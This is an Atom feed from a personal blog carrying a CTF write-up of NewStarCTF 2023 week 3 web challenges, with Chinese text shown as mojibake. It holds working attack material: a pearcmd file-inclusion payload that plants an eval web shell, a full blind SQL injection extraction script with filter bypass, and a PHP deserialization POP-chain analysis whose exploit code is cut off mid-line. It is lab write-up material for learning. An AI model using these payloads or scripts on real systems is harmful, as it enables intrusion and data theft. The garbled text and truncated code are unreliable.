<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iah&#39;s blog</title>
  
  
  <link href="https://iahzl.github.io/atom.xml" rel="self"/>
  
  <link href="https://iahzl.github.io/"/>
  <updated>2023-10-27T09:25:20.620Z</updated>
  <id>https://iahzl.github.io/</id>
  
  <author>
    <name>iahzl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NewStar2023 Week3</title>
    <link href="https://iahzl.github.io/NewStar2023-WriteUp-Week3/"/>
    <id>https://iahzl.github.io/NewStar2023-WriteUp-Week3/</id>
    <published>2023-10-27T09:13:23.000Z</published>
    <updated>2023-10-27T09:25:20.620Z</updated>
    
    <content type="html"><![CDATA[<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h4><p>é¢˜ç›®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºæ‰“å¼€<code>phpinfo.php</code> &#x3D;&gt; <code>?file=phpinfo</code>, æœç´¢flag</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100040895.png" alt="image-20231024100040895"></p><p>æ ¹æ®æç¤ºæœç´¢<code>register_argc_argv</code>, å‘ç°ä¸ºOn</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100618137.png" alt="image-20231024100618137"></p><p>ç»“åˆé¢˜ç›®æç¤ºğŸï¼Œåº”è¯¥æ˜¯åˆ©ç”¨pearcmdæ–‡ä»¶åŒ…å«</p><p>æ„é€ <strong>payload</strong></p><p><code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102307424.png" alt="image-20231024102307424"></p><p>è¿›è¡Œ<code>POST</code>æŸ¥çœ‹flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/cmd</span><br><span class="line"><span class="comment">#POST</span></span><br><span class="line"><span class="number">0</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102854987.png" alt="image-20231024102854987"></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p><h4 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h4><p>æµ‹è¯•åˆ¤æ–­æ˜¯å¦å­˜åœ¨å¸ƒå°”ç›²æ³¨ <strong># è¦ç¼–ç ä¸º%23</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>TMP0919<span class="string">&#x27;And if(1&gt;0,1,0)%23</span></span><br><span class="line"><span class="string">?id=TMP0919&#x27;</span><span class="keyword">And</span> if(<span class="number">0</span><span class="operator">&gt;</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p>å‰è€…å¯ä»¥è¿”å›æ­£å¸¸çš„ä¿¡æ¯<code>id: TMP0919</code>ï¼Œåè€…ä¼šè¿”å›<code>id not exists</code>  </p><p>æ³¨æ„ç”¨å¤§å°å†™ç»•è¿‡è¢«è¿‡æ»¤çš„å­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>(<span class="params"><span class="built_in">str</span>, url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] æµ‹è¯•æ•°æ®åº“é•¿åº¦.......&quot;</span>)</span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = url + <span class="string">f&quot;&#x27;%20And%20lengTh(daTabase())=<span class="subst">&#123;num&#125;</span>%23&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        r = requests.get(url=payload)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            db_length = num</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] æ•°æ®åº“é•¿åº¦ï¼š<span class="subst">&#123;db_length&#125;</span>&quot;</span>)</span><br><span class="line">            db_name(db_length)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>(<span class="params">db_length</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] æµ‹è¯•æ•°æ®åº“å.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;qwertyuioplkjhgfdsazxcvbnm1234567890&quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr(dAtabase(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] æ•°æ®åº“åï¼š<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line">    table_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] æµ‹è¯•æ•°æ®åº“ è¡¨å.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):  <span class="comment"># å‡å®šè¡¨çš„é•¿åº¦ä¸º25</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(table_name)%20fRom%20infoRmation_schema.tables%20wHere%20tAble_schema=dAtabase()),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="comment"># print(tmp)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] æ•°æ®åº“ è¡¨åï¼š<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line">    table_columns()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_columns</span>():  <span class="comment"># æ­¤å‡½æ•°æ˜¯åœ¨æµ‹è¯•å¤„æ•°æ®åº“è¡¨ååæ‰å†™å‡ºï¼Œå› è€ŒçŸ¥é“è¡¨åâ€œgrades,here_is_flagâ€</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] æµ‹è¯•æ•°æ®åº“è¡¨ä¸­åˆ—åä¿¡æ¯.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># å‡å®šåˆ—åé•¿åº¦ä¸º10</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(column_name)%20fRom%20infoRmation_schema.columns%20wHere%20tAble_name=&#x27;here_is_flag&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] æ•°æ®åº“è¡¨ä¸­åˆ—åä¿¡æ¯ï¼š<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line">    information_flag()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">information_flag</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] æµ‹è¯•æ•°æ®åº“è¡¨ä¸­æ•°æ®.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_, &#123;&#125;&quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr((Select%20flag%20fRom%20here_is_flag),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="comment"># print(tmp)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] æ•°æ®åº“è¡¨ä¸­æ•°æ®ï¼š<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://efffc673-9bf2-42fc-ac02-9a443cbe5a85.node4.buuoj.cn:81/?id=TMP0919&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;Physics&#x27;</span></span><br><span class="line">    db_length(<span class="built_in">str</span>, url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä¸Šè¿°è„šæœ¬æ²¡æœ‰ä½¿ç”¨ç®—æ³•ï¼Œç›´æ¥éå†è·å¾—ç›¸å…³ä¿¡æ¯ï¼Œå› è€Œè¿è¡Œæ—¶é—´è¾ƒé•¿ï¼Œå„ä½å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027122055140.png" alt="image-20231027122055140"></p><h4 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h4><p>é¢˜ç›®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;&#x2F;ç›®çš„æ˜¯è§¦å‘readfile(â€œ&#x2F;flagâ€)å‡½æ•°</p><p>&#x2F;&#x2F;éœ€è¦è§¦å‘WihteGod-&gt;__unset()æ–¹æ³• å°±å¿…é¡»é€šè¿‡unset(WihteGod()) </p><p>&#x2F;&#x2F;éœ€è¦unset(WihteGod()) å°±å¿…é¡»é€šè¿‡CTF-&gt;end()</p><p>&#x2F;&#x2F;éœ€è¦CTF-&gt;end() å°±å¿…é¡»é€šè¿‡Handle-&gt;__call()</p><p>&#x2F;&#x2F;éœ€è¦Handle-&gt;__call() å°±å¿…é¡»é€šè¿‡Handle-&gt;<a href="">ä¸å­˜åœ¨çš„å‡½æ•°</a> ä¹Ÿå°±æ˜¯Handle-&gt;getStr()   <strong>â€”callæ˜¯é­”æœ¯æ–¹æ³•çš„ä¸€ä¸ªï¼Œå½“ç¨‹åºè°ƒç”¨åˆ°å½“å‰ç±»ä¸­æœªå£°æ˜æˆ–æ²¡æƒé™è°ƒç”¨çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨â€”callæ–¹æ³•</strong></p><p>&#x2F;&#x2F;éœ€è¦Handle-&gt;getStr() å°±å¿…é¡»é€šè¿‡Super-&gt;__invoke() </p><p>&#x2F;&#x2F;éœ€è¦Super-&gt;__invoke() å°±å¿…é¡»é€šè¿‡(Super)()è¢«å½“åšå‡½æ•°è°ƒç”¨<strong>â€”invoke()ï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œâ€”invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</strong></p><p>&#x2F;&#x2F;éœ€è¦(Super)() å°±å¿…é¡»é€šè¿‡Then-&gt;__toString()</p><p>&#x2F;&#x2F;éœ€è¦Then-&gt;__toString() å°±å¿…é¡»Thenè¢«å½“åšå­—ç¬¦ä¸²</p><p>&#x2F;&#x2F;éœ€è¦Thenè¢«å½“åšå­—ç¬¦ä¸² å°±å¿…é¡»é€šè¿‡Begin-&gt;__destruct()</p></blockquote><p>ç”±é¢˜ç›®å¾—çŸ¥ï¼Œæˆ‘ä»¬æœ€ç»ˆæ˜¯è¦æƒ³åŠæ³•è§¦å‘<code>WhiteGod-&gt;__unset()æ–¹æ³•</code>ï¼Œè¿™æ ·å°±èƒ½å¤Ÿé€šè¿‡æ„é€ **WhiteGod(func,cmd)**ç±»ï¼Œä¼ å…¥éœ€è¦æ‰§è¡Œçš„å‡½æ•°å’Œå‘½ä»¤ï¼ˆä¾‹å¦‚<code>system(&quot;ls&quot;)</code>ï¼‰ã€‚</p><p>è¦è§¦å‘<code>WhiteGod-&gt;__unset()æ–¹æ³•</code>ï¼Œå°±å¿…é¡»æœ‰ä¸€ä¸ª<code>unset(WhiteGod-&gt;ä¸å­˜åœ¨)</code>ï¼Œä¹Ÿå°±æ˜¯**CTF(WhiteGod(func,cmd))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘<code>CTF-&gt;end()</code>ã€‚</p><p>è¦è§¦å‘<code>CTF-&gt;end()</code>æ–¹æ³•ï¼Œå°±åªèƒ½é€šè¿‡<code>Handle(CTF)</code>ï¼Œä¹Ÿå°±æ˜¯**Handle(CTF(WhiteGod(func,cmd)))**ã€‚å¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘<code>Handle-&gt;__call()</code>ã€‚</p><p>è¦è§¦å‘<code>Handle-&gt;__call()</code>æ–¹æ³•ï¼Œå°±éœ€è¦å‡ºç°<code>Handle-&gt;ä¸å­˜åœ¨</code>ï¼Œå³<code>Handle-&gt;ä¸å­˜åœ¨getStr()</code>ï¼Œä¹Ÿå°±æ˜¯**Super(Handle(CTF(WhiteGod(func,cmd))))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘<code>Super-&gt;__invoke()</code>ã€‚</p><p>è¦è§¦å‘<code>Super-&gt;__invoke()æ–¹æ³•</code>ï¼Œå°±éœ€è¦å‡ºç°<code>(Super)();</code>å³Superè¢«å½“åšå‡½æ•°åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯**Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘<code>Then-&gt;__toString()æ–¹æ³•</code>ã€‚</p><p>è¦è§¦å‘<code>Then-&gt;__toString()æ–¹æ³•</code>ï¼Œå°±éœ€è¦<code>Thenè¢«å½“åšå­—ç¬¦ä¸²å¤„ç†</code>ï¼Œå³<code>Begin()-&gt;__destruct()</code>ä¸­çš„æ­£åˆ™ã€‚ä¹Ÿå°±æ˜¯<strong>Begin(Then(Super(Handle(CTF(WhiteGod(func,cmd)))))</strong></p><p>è¿™æ ·ï¼Œå®Œæ•´çš„POPé“¾å°±æ„é€ å‡ºæ¥äº†</p><hr><p><strong>ç¼–å†™Exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Begin</span> <span class="keyword">as</span> <span class="title">GlobalBegin</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Then</span> <span class="keyword">as</span> <span class="title">GlobalThen</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span 